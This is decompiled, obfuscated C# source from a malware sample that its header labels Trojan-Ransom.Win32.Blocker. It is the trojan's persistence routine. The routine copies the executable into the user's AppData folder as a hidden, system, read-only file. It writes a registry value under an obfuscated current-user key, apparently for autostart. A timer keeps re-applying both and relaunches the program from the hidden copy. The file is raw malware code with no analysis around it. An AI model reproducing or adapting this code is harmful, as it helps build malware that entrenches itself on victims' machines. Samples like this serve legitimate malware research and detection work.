// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AV, Version=2.0.5.0, Culture=neutral, PublicKeyToken=null
// MVID: 56F2F6CB-C947-430A-8E47-6539AD6C5806
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.lavj-da251cb9358d6e9aaf7cf1499e2912744800b0ad4fe523a6f79298565ec0ebb7.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Timers;
using System.Windows.Forms;

internal sealed class \u0003\u2003
{
  private System.Timers.Timer \u0002;

  public static void \u0002()
  {
    \u0003\u2003.\u0002();
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0005\u2003.\u0002(1603305029), true);
      try
      {
        registryKey.DeleteValue(\u0008\u2000.\u0003\u2001, true);
      }
      catch
      {
      }
    }
    catch
    {
    }
    Environment.Exit(0);
  }

  public void \u0002()
  {
    if (this.\u0002 == null)
      return;
    this.\u0002.Enabled = false;
    this.\u0002.Stop();
  }

  public void \u0003()
  {
    \u0003\u2003.\u0003();
    \u0003\u2003.\u0005();
    this.\u0002 = new System.Timers.Timer((double) \u0008\u2000.\u000F\u2000);
    this.\u0002.Elapsed += new ElapsedEventHandler(\u0003\u2003.\u0002);
    this.\u0002.AutoReset = true;
    this.\u0002.Enabled = true;
  }

  private static void \u0002(object _param0, ElapsedEventArgs _param1)
  {
    \u0003\u2003.\u0003();
    \u0003\u2003.\u0005();
  }

  private static void \u0003()
  {
    string str = \u0003\u2003.\u0002();
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0005\u2003.\u0002(1603305029), true);
      try
      {
        registryKey.SetValue(\u0008\u2000.\u0003\u2001, (object) str);
      }
      catch
      {
      }
    }
    catch
    {
    }
  }

  private static void \u0005()
  {
    string str = \u0003\u2003.\u0002();
    try
    {
      File.SetAttributes(str, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
    }
    catch
    {
    }
    try
    {
      File.SetAttributes(str, FileAttributes.Normal);
    }
    catch
    {
    }
    try
    {
      File.Copy(Application.ExecutablePath, str, true);
      File.SetAttributes(str, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
    }
    catch
    {
    }
    try
    {
      if (!(Application.ExecutablePath != str))
        return;
      new Process() { StartInfo = new ProcessStartInfo(str) }.Start();
      Environment.Exit(0);
    }
    catch
    {
    }
  }

  private static string \u0002() => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), \u0008\u2000.\u0002\u2001);
}
